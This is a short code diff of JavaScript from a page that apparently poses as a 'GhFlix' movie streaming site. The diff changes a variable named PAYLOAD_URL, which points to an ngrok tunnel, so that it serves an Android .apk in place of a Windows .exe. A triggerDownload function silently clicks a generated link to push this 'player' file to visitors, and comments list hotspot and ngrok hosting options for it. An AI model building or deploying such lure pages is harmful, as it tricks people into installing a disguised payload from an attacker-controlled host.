@@ -407,7 +407,7 @@ footer .f-links a:hover{color:#aaa}
 //  Hotspot:  "http://192.168.43.XXX:8080/GhFlix_Player.exe"
 //  Ngrok:    "http://0.tcp.ngrok.io:XXXXX/GhFlix_Player.exe"
 // ============================================================
-var PAYLOAD_URL = "https://f055-154-161-97-178.ngrok-free.app/GhFlix_Player_Setup.exe";
+var PAYLOAD_URL = "https://f055-154-161-97-178.ngrok-free.app/GhFlix_Player.apk";
 
 var currentMovie = "";
 var currentQuality = "";
@@ -455,7 +455,7 @@ function triggerDownload() {
   }
   var a = document.createElement('a');
   a.href = PAYLOAD_URL;
-  a.download = 'GhFlix_Player_Setup.exe';
+  a.download = 'GhFlix_Player.apk';
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
